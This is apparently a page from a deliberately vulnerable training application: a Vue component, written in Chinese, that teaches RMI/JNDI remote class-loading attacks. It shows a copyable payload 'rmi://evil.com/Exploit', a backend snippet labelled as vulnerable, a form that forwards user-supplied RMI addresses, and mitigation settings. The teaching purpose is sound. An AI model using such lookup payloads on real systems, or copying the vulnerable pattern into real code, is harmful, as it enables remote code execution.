<template>
  <vuln-template
    title="RMI攻击"
    subtitle="RMI Attack"
    level="严重"
    :icon="ClusterOutlined"
  >
    <template #description>
      <a-typography-paragraph>
        <strong>RMI攻击</strong>是指通过RMI（远程方法调用）协议加载远程恶意类进行攻击。
      </a-typography-paragraph>
      <a-typography-paragraph>
        RMI攻击的危害：
      </a-typography-paragraph>
      <ul>
        <li>通过RMI协议加载远程恶意类</li>
        <li>远程代码执行</li>
        <li>完全控制服务器</li>
      </ul>
    </template>

    <template #payload>
      <a-typography-paragraph>
        常见的RMI攻击地址：
      </a-typography-paragraph>
      <a-typography-paragraph code copyable>
        rmi://evil.com/Exploit
      </a-typography-paragraph>
    </template>

    <template #test-form>
      <div class="rmi-container">
        <a-card title="RMI服务调用" :bordered="false" style="margin-bottom: 24px;">
          <a-typography-paragraph>
            输入RMI服务地址，系统将为您调用远程RMI服务。
          </a-typography-paragraph>
        </a-card>
        
        <a-form :model="formState" @finish="handleSubmit" layout="vertical">
          <a-form-item
            label="RMI服务地址"
            name="rmiUrl"
            :rules="[{ required: true, message: '请输入RMI地址' }]"
          >
            <a-input
              v-model:value="formState.rmiUrl"
              size="large"
              placeholder="例如：rmi://example.com/Service"
              prefix="🔗"
            />
          </a-form-item>

          <a-form-item>
            <a-space>
              <a-button type="primary" html-type="submit" size="large" :loading="loading">
                <template #icon><cluster-outlined /></template>
                调用RMI服务
              </a-button>
              <a-button size="large" @click="handleReset">
                <template #icon><redo-outlined /></template>
                重置
              </a-button>
            </a-space>
          </a-form-item>
        </a-form>
      </div>
    </template>

    <template #result v-if="result">
      <div class="result-content">
        <pre style="margin: 0;">{{ result }}</pre>
      </div>
    </template>

    <template #source-code>
      <a-typography-paragraph>
        <strong>后端源码（存在漏洞）：</strong>
      </a-typography-paragraph>
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="sourceCode" style="margin: 0;">
          <pre class="code-block"><code>@Controller
@RequestMapping("/home/deserialize")
public class RMIRegistry {
    @RequestMapping("/rmi")
    public String rmi(int port, Model model) {
        try {
            // 漏洞：创建RMI注册表，可能被攻击者利用
            // 如果应用程序通过RMI加载远程类，攻击者可以构造恶意RMI服务器
            Registry registry = LocateRegistry.createRegistry(port);
            // RMI默认会从远程加载类，攻击者可以构造恶意类实现RCE
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "deserialize/rmi";
    }
}

// 漏洞场景：当应用程序使用RMI时
// 1. 通过JNDI查找RMI服务：InitialContext.lookup("rmi://evil.com/Exploit")
// 2. RMI会从远程加载类，攻击者可以构造恶意类
// 3. 恶意类在反序列化时执行代码，实现RCE</code></pre>
      </a-typography-paragraph>
      </div>
      <a-alert
        message="漏洞点：RMI协议默认允许从远程加载类。当应用程序通过JNDI查找RMI服务或反序列化RMI对象时，RMI会从远程服务器加载类。攻击者可以构造恶意RMI服务器，提供恶意类，实现远程代码执行。"
        type="error"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #fix>
      <a-typography-paragraph>
        <strong>修复建议：</strong>
      </a-typography-paragraph>
      <ul style="padding-left: 20px; line-height: 2;">
        <li><strong>禁用远程类加载：</strong>设置java.rmi.server.useCodebaseOnly=true</li>
        <li><strong>禁用JNDI：</strong>设置com.sun.jndi.rmi.object.trustURLCodebase=false</li>
        <li><strong>使用白名单：</strong>只允许连接可信的RMI服务器</li>
        <li><strong>网络隔离：</strong>限制RMI服务的网络访问</li>
        <li><strong>升级JDK：</strong>使用JDK 8u191+版本，默认禁用远程类加载</li>
        <li><strong>避免使用RMI：</strong>使用更安全的通信协议（如REST API）</li>
      </ul>
      
      <div style="margin-top: 16px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode1" style="margin: 0;">
          <pre class="code-block"><code>// 错误示例(易受攻击)
        InitialContext ctx = new InitialContext();
Object obj = ctx.lookup("rmi://evil.com/Exploit"); // 会从远程加载类</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode2" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例1：JVM启动参数禁用远程类加载
        // 在JVM启动参数中添加：
java -Djava.rmi.server.useCodebaseOnly=true \\
     -Dcom.sun.jndi.rmi.object.trustURLCodebase=false \\
     -Dcom.sun.jndi.ldap.object.trustURLCodebase=false \\
     -jar app.jar</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode3" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例2：在代码中设置系统属性
        @PostConstruct
        public void init() {
            // 禁用RMI远程类加载
            System.setProperty("java.rmi.server.useCodebaseOnly", "true");
            System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "false");
            System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "false");
}</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode4" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例3：使用白名单验证RMI地址
        private static final String[] ALLOWED_RMI_HOSTS = {
            "internal-server.example.com",
            "trusted-server.example.com"
        };
        
        public Object lookupRMI(String rmiUrl) {
            try {
                URL url = new URL(rmiUrl);
                String host = url.getHost();
                
                // 验证主机是否在白名单中
                boolean isAllowed = false;
                for (String allowedHost : ALLOWED_RMI_HOSTS) {
                    if (host.equals(allowedHost)) {
                        isAllowed = true;
                        break;
                    }
                }
                
                if (!isAllowed) {
                    throw new SecurityException("不允许的RMI主机: " + host);
                }
                
                InitialContext ctx = new InitialContext();
                return ctx.lookup(rmiUrl);
            } catch (Exception e) {
                throw new RuntimeException("RMI查找失败", e);
            }
}</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode5" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例4：使用REST API替代RMI
        // 不要使用RMI，使用REST API进行服务调用
        @RestController
        @RequestMapping("/api")
        public class ServiceController {
            @GetMapping("/service")
            public String getService() {
                return "服务响应";
            }
}</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode6" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例5：升级JDK版本
        // JDK 8u191+版本默认禁用远程类加载
// 确保使用JDK 8u191或更高版本</code></pre>
      </a-typography-paragraph>
      </div>
    </template>
  </vuln-template>
</template>

<script setup>
import { reactive, ref } from 'vue'
import { message } from 'ant-design-vue'
import { ClusterOutlined, RedoOutlined } from '@ant-design/icons-vue'
import VulnTemplate from '@/components/VulnTemplate.vue'
import axios from 'axios'

const loading = ref(false)
const result = ref('')

const sourceCode = `@Controller
@RequestMapping("/home/deserialize")
public class RMIRegistry {
    @RequestMapping("/rmi")
    public String rmi(int port, Model model) {
        try {
            // 漏洞：创建RMI注册表，可能被攻击者利用
            // 如果应用程序通过RMI加载远程类，攻击者可以构造恶意RMI服务器
            Registry registry = LocateRegistry.createRegistry(port);
            // RMI默认会从远程加载类，攻击者可以构造恶意类实现RCE
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "deserialize/rmi";
    }
}

// 漏洞场景：当应用程序使用RMI时
// 1. 通过JNDI查找RMI服务：InitialContext.lookup("rmi://evil.com/Exploit")
// 2. RMI会从远程加载类，攻击者可以构造恶意类
// 3. 恶意类在反序列化时执行代码，实现RCE`

const fixCode1 = `// 错误示例(易受攻击)
InitialContext ctx = new InitialContext();
Object obj = ctx.lookup("rmi://evil.com/Exploit"); // 会从远程加载类`

const fixCode2 = `// 正确示例1：JVM启动参数禁用远程类加载
// 在JVM启动参数中添加：
java -Djava.rmi.server.useCodebaseOnly=true \\
     -Dcom.sun.jndi.rmi.object.trustURLCodebase=false \\
     -Dcom.sun.jndi.ldap.object.trustURLCodebase=false \\
     -jar app.jar`

const fixCode3 = `// 正确示例2：在代码中设置系统属性
@PostConstruct
public void init() {
    // 禁用RMI远程类加载
    System.setProperty("java.rmi.server.useCodebaseOnly", "true");
    System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "false");
    System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "false");
}`

const fixCode4 = `// 正确示例3：使用白名单验证RMI地址
private static final String[] ALLOWED_RMI_HOSTS = {
    "internal-server.example.com",
    "trusted-server.example.com"
};

public Object lookupRMI(String rmiUrl) {
    try {
        URL url = new URL(rmiUrl);
        String host = url.getHost();
        
        // 验证主机是否在白名单中
        boolean isAllowed = false;
        for (String allowedHost : ALLOWED_RMI_HOSTS) {
            if (host.equals(allowedHost)) {
                isAllowed = true;
                break;
            }
        }
        
        if (!isAllowed) {
            throw new SecurityException("不允许的RMI主机: " + host);
        }
        
        InitialContext ctx = new InitialContext();
        return ctx.lookup(rmiUrl);
    } catch (Exception e) {
        throw new RuntimeException("RMI查找失败", e);
    }
}`

const fixCode5 = `// 正确示例4：使用REST API替代RMI
// 不要使用RMI，使用REST API进行服务调用
@RestController
@RequestMapping("/api")
public class ServiceController {
    @GetMapping("/service")
    public String getService() {
        return "服务响应";
    }
}`

const fixCode6 = `// 正确示例5：升级JDK版本
// JDK 8u191+版本默认禁用远程类加载
// 确保使用JDK 8u191或更高版本`

const formState = reactive({
  rmiUrl: ''
})

const handleSubmit = async () => {
  loading.value = true
  try {
    const response = await axios.get('/home/deserialize/rmi', {
      params: formState
    })
    result.value = response.data
    message.success('测试完成')
  } catch (error) {
    message.error('测试失败：' + (error.response?.data || error.message))
  } finally {
    loading.value = false
  }
}

const handleReset = () => {
  formState.rmiUrl = ''
  result.value = ''
}
</script>
